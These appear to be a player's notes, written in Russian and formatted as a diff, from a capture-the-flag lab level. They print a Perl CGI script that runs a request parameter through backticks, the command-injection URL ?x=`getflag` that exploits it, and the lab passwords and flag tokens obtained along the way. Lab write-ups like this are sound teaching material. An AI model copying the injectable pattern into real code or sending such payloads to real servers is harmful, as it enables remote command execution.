@@ -1,0 +1,29 @@
+su level04
+qi0maab88jeaj46qoumi7maus
+
+ls
+level04.pl 
+гуглим
+https://open-file.ru/types/pl
+скрипт perl
+смотрим что в скрипте cat level04.pl 
+
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+
+отправка сет  запроса с параметром
+https://developer.mozilla.org/ru/docs/Learn/Forms/Sending_and_retrieving_form_data
+
+в качестве значение отправляем гетфлаг в обратном апострофе(Гра́висе) для того чтобы echo выполнял это значение как бинаррник
+http://192.168.56.105:4747/?x=`getflag`
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+su level05
+ne2searoevaevoem4ov4ar8ap
